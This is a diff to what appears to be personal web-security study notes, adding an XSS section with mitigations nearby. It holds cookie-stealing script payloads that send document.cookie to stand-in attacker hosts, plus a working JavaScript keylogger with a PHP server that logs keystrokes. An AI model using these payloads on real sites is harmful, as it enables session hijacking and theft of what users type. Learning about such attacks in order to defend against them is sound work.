@@ -39,7 +39,7 @@ Mitigation
 - Use parameterized queries
 - Validate user input
 
-### Javascript injection
+### Javascript Injection
 Can allow the attacker manipulate client side code in the website by injecting malicious javascript via <script></script> tag via an unsanitized user input field
 Typical JS Injection targets are:
 - Various forums
@@ -58,8 +58,66 @@ Mitigation
 - Sanitize user input
 - Remove `script` tag when saving in database
 ### XSS
+Attacker tries to gain information by injecting javascript in the target website. This can result in
+- Cookie theft
+    ```bash
+    <script>window.location='http://attacker-site/?cookie='+document.cookie</script>
+    ```
+- Keylogging
+
+    exploit.js
+    ```bash
+    var keys = '';
+
+    document.onkeypress = function(e) {
+        var get = window.event ? event : e;
+        var key = get.keyCode ? get.keyCode : get.charCode;
+        key = String.fromCharCode(key);
+        keys += key;----
+    }
+
+    window.setInterval(function(){
+        new Image().src = 'http://127.0.0.1/demo/1/exploit/exploit.php?keylog=' + keys;
+        keys = '';
+    }, 1000);
+    ```
+    server
+    ```bash
+    <?php
+
+    if(!empty($_GET['keylog'])) {
+        $logfile = fopen('logs.txt', 'a+');
+        fwrite($logfile, $_GET['keylog']);
+        fclose($logfile);
+    }
+    ?>
+    ```
+- Phishing
+
+Types of XSS
   - Reflective
-  - persistent
+
+    When attacker tricks an user to click on a link (sent in email) and adds malicious js code in the link
+    ```bash
+    https://www.bigbank.com/q?=
+    <script>
+    document.write('<img src="http://attacker/?cookie='+ document.cookie'"/>')
+    </script>
+    ```
+  - Persistent
+
+    This can happen when attacker successfully injects js in a webpage that loads for other users
+
+    1. Attcker --> POST https://website/comment
+    ```bash
+    <script>window.location='http://attacker-site/?cookie='+document.cookie</script>
+    ```
+    2. Website saves comment with js code withing script tag
+    3. Victim loads webpage, obliious of malicious js loading GET http://website/comments
+    4. Attacker receives cookie 
+    ```
+    http://attacker-site/?cookie=<some-cookie>
+    ```
 ### CSRF
 ### Broken authentication
 ### Privilege excalation
